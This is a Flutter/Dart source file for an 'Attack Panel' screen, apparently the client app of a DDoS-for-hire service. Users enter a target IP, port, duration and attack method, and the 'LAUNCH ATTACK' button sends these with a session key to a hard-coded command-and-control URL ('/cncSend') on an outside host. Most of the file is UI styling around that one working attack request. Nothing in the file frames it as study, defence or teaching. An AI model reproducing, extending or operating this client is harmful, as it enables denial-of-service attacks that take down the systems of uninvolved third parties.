import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "http://fajzz-hosting.kalzzptero.my.id:25582";
  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;

  // --- TEMA DEEP PURPLE MODERN ---
  final Color bgDark = const Color(0xFF0A0A2A);
  final Color deepPurple = const Color(0xFF6B3FA0);
  final Color lightPurple = const Color(0xFF9B6BFF);
  final Color primaryWhite = Colors.white;
  final Color subtleGlass = Colors.white.withOpacity(0.03);
  final Color borderSubtle = Colors.white.withOpacity(0.08);

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("Invalid Input", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("Invalid Port", "Please input a valid port.");
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      print(data);

      if (data["cooldown"] == true) {
        _showAlert("Cooldown", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("Invalid Key", "Your session key is invalid. Please log in again.");
      } else if (data["sended"] == false) {
        _showAlert("Failed", "Failed to send attack. The server may be under maintenance.");
      } else {
        _showAlert("Success", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("Error", "An unexpected error occurred. Please try again.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: lightPurple.withOpacity(0.2)),
        ),
        title: Text(
          title,
          style: TextStyle(
            color: primaryWhite,
            fontWeight: FontWeight.w600,
            fontSize: 18,
          ),
        ),
        content: Text(
          msg,
          style: TextStyle(
            color: primaryWhite.withOpacity(0.7),
            fontSize: 13,
          ),
        ),
        actions: [
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [deepPurple, lightPurple],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(10),
            ),
            child: TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text(
                "OK",
                style: TextStyle(
                  color: primaryWhite,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        title: const Text(
          "Attack Panel",
          style: TextStyle(
            fontWeight: FontWeight.w600,
            fontSize: 18,
            letterSpacing: 0.5,
            color: Colors.white,
          ),
        ),
        centerTitle: true,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_new, color: lightPurple, size: 20),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              bgDark,
              deepPurple.withOpacity(0.05),
              bgDark,
            ],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(20),
            child: Column(
              children: [
                FadeTransition(
                  opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                  child: Container(
                    width: 100,
                    height: 100,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: LinearGradient(
                        colors: [deepPurple, lightPurple],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: lightPurple.withOpacity(0.2),
                          blurRadius: 20,
                          spreadRadius: 2,
                        ),
                      ],
                    ),
                    child: const Center(
                      child: Icon(
                        Icons.flash_on,
                        color: Colors.white,
                        size: 48,
                      ),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Text(
                  "Attack Configuration",
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 18,
                    fontWeight: FontWeight.w600,
                    letterSpacing: 0.5,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  "Configure your attack parameters below",
                  style: TextStyle(
                    color: primaryWhite.withOpacity(0.5),
                    fontSize: 12,
                  ),
                ),
                const SizedBox(height: 24),

                // Target Input Card
                _buildInputCard(
                  icon: Icons.computer,
                  title: "Target IP",
                  child: TextField(
                    controller: targetController,
                    style: TextStyle(color: primaryWhite, fontSize: 14),
                    cursorColor: lightPurple,
                    decoration: _inputStyle("e.g., 1.1.1.1"),
                  ),
                ),
                const SizedBox(height: 16),

                // Port Input Card
                _buildInputCard(
                  icon: Icons.wifi_tethering,
                  title: "Port",
                  child: TextField(
                    controller: portController,
                    enabled: !isIcmp,
                    keyboardType: TextInputType.number,
                    style: TextStyle(
                      color: isIcmp ? primaryWhite.withOpacity(0.3) : primaryWhite,
                      fontSize: 14,
                    ),
                    cursorColor: isIcmp ? Colors.grey : lightPurple,
                    decoration: _inputStyle(
                      isIcmp ? "ICMP does not use port" : "e.g., 80",
                      isIcmp: isIcmp,
                    ),
                  ),
                ),
                const SizedBox(height: 16),

                // Duration Slider
                _buildInputCard(
                  icon: Icons.timer,
                  title: "Attack Duration",
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Text(
                            "Duration",
                            style: TextStyle(
                              color: primaryWhite.withOpacity(0.6),
                              fontSize: 12,
                            ),
                          ),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                            decoration: BoxDecoration(
                              color: deepPurple.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(6),
                            ),
                            child: Text(
                              "${attackDuration.toInt()} seconds",
                              style: TextStyle(
                                color: lightPurple,
                                fontSize: 12,
                                fontWeight: FontWeight.w600,
                              ),
                            ),
                          ),
                        ],
                      ),
                      Slider(
                        value: attackDuration,
                        min: 10,
                        max: 300,
                        divisions: 29,
                        activeColor: lightPurple,
                        inactiveColor: primaryWhite.withOpacity(0.1),
                        onChanged: (value) {
                          setState(() => attackDuration = value);
                        },
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),

                // Attack Method Dropdown
                _buildInputCard(
                  icon: Icons.flash_on,
                  title: "Attack Method",
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      color: subtleGlass,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: borderSubtle),
                    ),
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        dropdownColor: bgDark,
                        value: selectedDoosId,
                        isExpanded: true,
                        iconEnabledColor: lightPurple,
                        style: TextStyle(
                          color: primaryWhite,
                          fontSize: 14,
                        ),
                        items: widget.listDoos.map((doos) {
                          return DropdownMenuItem<String>(
                            value: doos['ddos_id'],
                            child: Text(
                              doos['ddos_name'],
                              style: TextStyle(color: primaryWhite),
                            ),
                          );
                        }).toList(),
                        onChanged: (value) {
                          setState(() {
                            selectedDoosId = value!;
                          });
                        },
                      ),
                    ),
                  ),
                ),
                const SizedBox(height: 32),

                // Send Button
                SizedBox(
                  width: double.infinity,
                  height: 52,
                  child: Container(
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [deepPurple, lightPurple],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      borderRadius: BorderRadius.circular(14),
                      boxShadow: [
                        BoxShadow(
                          color: lightPurple.withOpacity(0.2),
                          blurRadius: 10,
                          offset: const Offset(0, 2),
                        ),
                      ],
                    ),
                    child: ElevatedButton.icon(
                      onPressed: _sendDoos,
                      icon: Icon(Icons.bolt, color: primaryWhite, size: 18),
                      label: Text(
                        "LAUNCH ATTACK",
                        style: TextStyle(
                          fontSize: 14,
                          fontWeight: FontWeight.w600,
                          letterSpacing: 1,
                          color: primaryWhite,
                        ),
                      ),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(14),
                        ),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildInputCard({
    required IconData icon,
    required String title,
    required Widget child,
  }) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: subtleGlass,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderSubtle),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: deepPurple.withOpacity(0.12),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: lightPurple, size: 18),
              ),
              const SizedBox(width: 10),
              Text(
                title,
                style: TextStyle(
                  color: primaryWhite,
                  fontWeight: FontWeight.w600,
                  fontSize: 14,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(
        color: isIcmp ? primaryWhite.withOpacity(0.3) : primaryWhite.withOpacity(0.5),
        fontSize: 13,
      ),
      filled: true,
      fillColor: subtleGlass,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      border: OutlineInputBorder(
        borderSide: BorderSide(color: borderSubtle),
        borderRadius: BorderRadius.circular(12),
      ),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: borderSubtle),
        borderRadius: BorderRadius.circular(12),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: lightPurple, width: 1.5),
        borderRadius: BorderRadius.circular(12),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}